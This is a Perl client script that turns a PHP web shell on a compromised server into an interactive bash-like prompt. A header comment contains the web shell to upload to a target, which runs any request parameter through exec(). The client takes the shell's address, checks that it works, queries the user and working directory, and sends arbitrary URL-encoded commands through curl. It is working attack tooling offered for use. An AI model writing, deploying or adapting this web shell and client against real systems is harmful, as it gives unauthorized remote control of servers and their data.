#!/opt/local/bin/perl

##########################################################
# This perl script interacts with a simple php shell.    #
# It is designed to act like a standard bash style shell #
# It does have some limitations and is a work in         #
# progress. Enjoy it!                                    #
##########################################################
# Todos:                     #  Limitations/Bugs:        #
# - Completely fix URLEncode #  - ctrl-c resets prompt   #
# - separate commands by ;   #    the first time but not #
#   and have them run        #    after that             #
#   separately (split?)      #  - Try not to make        #
# - Fix ctrl-C               #    commands too complex   #
# - remove global vars       #  - cd will bug out a bit  #
# - clean up code, always    #    if there are multiple  #
# - Base64 encode URL        #    in one command         #
##########################################################
# Here is the simple shell to upload to the target	 #
# <?php                                                  #
# 	 $cmd = $_REQUEST["s"];                          #
#	 exec($cmd, $out);                               #
#	 foreach ($out as $line){                        #
#		 echo "$line <br>";                      #
#	 }                                               #
# ?>                                                     #
##########################################################

use warnings;
use strict;
our $pwd; #working directory variable 
our $loc; #web address of web shell
our $user; #user being used to run commands
our $curl; #curl+options+$loc+s
our $debug; # debug variable
$SIG{INT} = \&ctrlc; #defines control-C action

############################
# Simple function to strip #
# HTML tags <*> from input #
# parameter. Changes <br>s #
# to \n's as well for      #
# nicer output.            #
############################
sub StripTags{
	if (defined($_[1])){
		$_[0] =~ s/<br>/\n/g;
	}
	$_[0] =~ s/<\w+>|<\/\w+>//g;
}

############################
# A janky way to do cd...  #
# cd's to the previous dir #
# runs the full command    #
# and then figures out the #
# pwd (dir after command   #
#   HEY IT WORKS OKAY?!?   #
############################
sub cd{
	my $input = $_[0];
        URLEncode($input);
        my $encpwd=$pwd;
        URLEncode($encpwd);
	$pwd = `$curl=%63%64%20$encpwd%3B$input%3B%70%77%64`;
	StripTags($pwd);
	$pwd =~ s/^\s+|\s+$//g;	
}

############################
# URL Encodes most of the  #
# input. Excludes: A-F,    #
# 0-9, % and ^ for now b/c #
# they were casusing       #
# issues with double       #
# replacement              #
############################
sub URLEncode{
        $_[0] =~ s/ /%20/g;
        $_[0] =~ s/!/%21/g;
        $_[0] =~ s/"/%22/g;
        $_[0] =~ s/#/%23/g;
        $_[0] =~ s/\$/%24/g;
        #$_[0] =~ s/%/%25/g;
        $_[0] =~ s/&/%26/g;
        $_[0] =~ s/'/%27/g;
        $_[0] =~ s/\(/%28/g;
        $_[0] =~ s/\)/%29/g;
        $_[0] =~ s/\*/%2A/g;
        $_[0] =~ s/\+/%2B/g;
        $_[0] =~ s/,/%2C/g;
        $_[0] =~ s/-/%2D/g;
        $_[0] =~ s/\./%2E/g;
        $_[0] =~ s/\//%2F/g;
        #$_[0] =~ s/0/%30/g;
        #$_[0] =~ s/1/%31/g;
        #$_[0] =~ s/2/%32/g;
        #$_[0] =~ s/3/%33/g;
        #$_[0] =~ s/4/%34/g;
        #$_[0] =~ s/5/%35/g;
        #$_[0] =~ s/6/%36/g;
        #$_[0] =~ s/7/%37/g;
        #$_[0] =~ s/8/%38/g;
        #$_[0] =~ s/9/%39/g;
        $_[0] =~ s/:/%3A/g;
        $_[0] =~ s/;/%3B/g;
        $_[0] =~ s/</%3C/g;
        $_[0] =~ s/=/%3D/g;
        $_[0] =~ s/>/%3E/g;
        $_[0] =~ s/\?/%3F/g;
        $_[0] =~ s/@/%40/g;
        #$_[0] =~ s/A/%41/g;
        #$_[0] =~ s/B/%42/g;
        #$_[0] =~ s/C/%43/g;
        #$_[0] =~ s/D/%44/g;
        #$_[0] =~ s/E/%45/g;
        #$_[0] =~ s/F/%46/g;
        $_[0] =~ s/G/%47/g;
        $_[0] =~ s/H/%48/g;
        $_[0] =~ s/I/%49/g;
        $_[0] =~ s/J/%4A/g;
        $_[0] =~ s/K/%4B/g;
        $_[0] =~ s/L/%4C/g;
        $_[0] =~ s/M/%4D/g;
        $_[0] =~ s/N/%4E/g;
        $_[0] =~ s/O/%4F/g;
        $_[0] =~ s/P/%50/g;
        $_[0] =~ s/Q/%51/g;
        $_[0] =~ s/R/%52/g;
        $_[0] =~ s/S/%53/g;
        $_[0] =~ s/T/%54/g;
        $_[0] =~ s/U/%55/g;
        $_[0] =~ s/V/%56/g;
        $_[0] =~ s/W/%57/g;
        $_[0] =~ s/X/%58/g;
        $_[0] =~ s/Y/%59/g;
        $_[0] =~ s/Z/%5A/g;
        $_[0] =~ s/\[/%5B/g;
        $_[0] =~ s/\\/%5C/g;
        $_[0] =~ s/\]/%5D/g;
        #$_[0] =~ s/^/%5E/g;
        $_[0] =~ s/_/%5F/g;
        $_[0] =~ s/a/%61/g;
        $_[0] =~ s/b/%62/g;
        $_[0] =~ s/c/%63/g;
        $_[0] =~ s/d/%64/g;
        $_[0] =~ s/e/%65/g;
        $_[0] =~ s/f/%66/g;
        $_[0] =~ s/g/%67/g;
        $_[0] =~ s/h/%68/g;
        $_[0] =~ s/i/%69/g;
        $_[0] =~ s/j/%6A/g;
        $_[0] =~ s/k/%6B/g;
        $_[0] =~ s/l/%6C/g;
        $_[0] =~ s/m/%6D/g;
        $_[0] =~ s/n/%6E/g;
        $_[0] =~ s/o/%6F/g;
        $_[0] =~ s/p/%70/g;
        $_[0] =~ s/q/%71/g;
        $_[0] =~ s/r/%72/g;
        $_[0] =~ s/s/%73/g;
        $_[0] =~ s/t/%74/g;
        $_[0] =~ s/u/%75/g;
        $_[0] =~ s/v/%76/g;
        $_[0] =~ s/w/%77/g;
        $_[0] =~ s/x/%78/g;
        $_[0] =~ s/y/%79/g;
        $_[0] =~ s/z/%7A/g;
        $_[0] =~ s/{/%7B/g;
        $_[0] =~ s/\|/%7C/g;
        $_[0] =~ s/}/%7D/g;
        $_[0] =~ s/~/%7E/g;
        $_[0] =~ s/`/%80/g;
}

############################
# Defines ctrl-c behavior. #
# Kills curl and returns   #
# to the shell.            #
############################
sub ctrlc{
	`killall curl &>/dev/null`;
	print "\n";
	shell();
}

############################
# The main shell of the    #
# program. Runs commands   #
# with curl.               #
############################
sub shell{
	print "$pwd $user\$ "; #prints shell-like prompt
	chomp(my $input = <STDIN>);
	my @parts = split(';',$input);
	if ($input eq "quit" || $input eq "exit"){
		exit;
	}
        if ($input eq ""){
            return;
        }
        if ($input eq "debugon"){
                $debug=1;
                return;
        }
        if ($input eq "debugoff"){
                $debug=0;
                return;
        }
        if ($debug){
            print "debug: $input\n";
            print "debug: $curl=cd $pwd;$input 2>&1\n";
        }
        URLEncode($input);
        my $encpwd = $pwd;
        URLEncode($encpwd);
        if ($debug){print "debug: $curl=%63%64%20$encpwd%3B$input%202%3E%261\n";}
	foreach my $cmd (@parts){
		if ($cmd =~ m/cd \S+/){
			cd($cmd);
		}
	}

	chomp(my $output = `$curl=%63%64%20$encpwd%3B$input%202%3E%261`); #runs command and captures output
	#clean up output
	StripTags($output,1);
	chomp($output);
	$output =~ s/^\s+|\s+$//g;

	if ($output ne ""){
		print "$output\n";
	}
}

#prompt for, get, and check for existence of a web shell at the user spcified address.
print "Address of shell: ";
chomp($loc = <STDIN>);
#set up $curl variable
$curl = "curl -s $loc?%73";
if (`$curl=echo%20index.php` =~ m/index\.php/){
	print "Shell found!\n";
}else{
	print "Shell not found!\n";
	exit;
}

#get current user and working dir for the prompt
$user = `$curl=whoami`;
StripTags($user);
chomp($user);
$pwd = `$curl=pwd`;
StripTags($pwd);
chomp($pwd);
$user =~ s/\s+$|^\s+//g;
$pwd =~ s/^\s+|\s+$//g;

#run the shell until "quit" or "exit"
while (1){
	shell();
}
